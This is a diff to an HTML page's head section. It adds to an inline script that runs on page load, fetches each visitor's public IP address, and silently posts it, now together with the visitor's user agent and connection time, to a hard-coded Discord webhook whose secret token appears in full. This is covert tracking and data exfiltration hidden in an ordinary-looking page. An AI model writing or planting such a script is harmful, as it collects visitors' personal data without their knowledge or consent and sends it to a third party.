@@ -10,16 +10,24 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@1,300&family=Prata&family=Special+Elite&family=Suranna&family=Tilt+Warp&display=swap" rel="stylesheet">
 <script>
-  fetch('https://api.ipify.org?format=json')
+ fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => {
-    // Send IP address to your Discord webhook
+    const ipAddress = data.ip;
+    const connectionTime = new Date().toLocaleString(); // Get the current time of connection
+
+    // Get user agent
+    const userAgent = navigator.userAgent;
+
+    // Send IP address, user agent, and connection time to your Discord webhook
     fetch('https://discord.com/api/webhooks/1212340570111082496/lL1jXaSlJSaf6TelK6ij3eGXr4UTuwC5m2Ihc53dwu7C42eosqASEAOw97Y7hjUJzXF3', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
       },
-      body: JSON.stringify({ content: 'New IP Address: ' + data.ip })
+      body: JSON.stringify({ 
+        content: `New IP Address: ${ipAddress}\n \nUser Agent: ${userAgent}\n \nConnection Time: ${connectionTime}`
+      })
     });
   });
 </script>
